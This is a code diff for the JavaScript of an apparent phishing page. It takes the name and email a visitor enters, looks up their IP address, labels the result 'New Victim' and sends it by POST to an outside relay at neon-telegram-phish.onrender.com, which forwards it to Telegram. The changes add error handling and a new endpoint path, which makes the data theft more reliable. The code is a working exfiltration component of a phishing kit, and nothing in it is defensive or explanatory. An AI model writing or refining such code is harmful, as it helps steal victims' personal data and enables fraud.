@@ -87,13 +87,15 @@
       const email = document.getElementById("email").value;
 
       fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
+        .then(response => {
+          if (!response.ok) throw new Error("Failed to fetch IP address.");
+          return response.json();
+        })
         .then(data => {
           const userIP = data.ip;
-
           const message = `New Victim:\nName: ${name}\nEmail: ${email}\nIP Address: ${userIP}`;
 
-          fetch('https://neon-telegram-phish.onrender.com', {
+          fetch('https://neon-telegram-phish.onrender.com/sendToTelegram', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
@@ -103,7 +105,10 @@
               message: message
             })
           })
-          .then(response => response.json())
+          .then(response => {
+            if (!response.ok) throw new Error("Error sending message to Telegram.");
+            return response.json();
+          })
           .then(data => {
             alert("Message sent to Telegram!");
           })
